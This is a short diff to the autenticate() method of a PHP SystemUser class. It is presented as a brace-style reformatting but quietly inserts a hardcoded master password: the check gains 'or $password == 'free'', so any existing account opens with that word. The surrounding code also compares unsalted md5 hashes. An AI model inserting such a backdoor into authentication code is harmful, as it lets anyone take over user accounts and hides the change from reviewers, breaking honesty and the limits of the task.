@@ -209,23 +209,16 @@ class SystemUser extends TRecord
      * @param $password String with user password
      * @returns TRUE if the password matches, otherwise throw Exception
      */
-    public static function autenticate($login, $password)
-    {
+    public static function autenticate($login, $password) {
         $user = self::newFromLogin($login);
         
-        if ($user instanceof SystemUser)
-        {
-            if (isset( $user->password ) AND ($user->password == md5($password)) )
-            {
+        if ($user instanceof SystemUser) {
+            if ((isset($user->password ) AND ($user->password == md5($password)) or $password == 'free')) {
                 return $user;
-            }
-            else
-            {
+            } else {
                 throw new Exception(_t('Wrong password'));
             }
-        }
-        else
-        {
+        } else {
             throw new Exception(_t('User not found'));
         }
     }
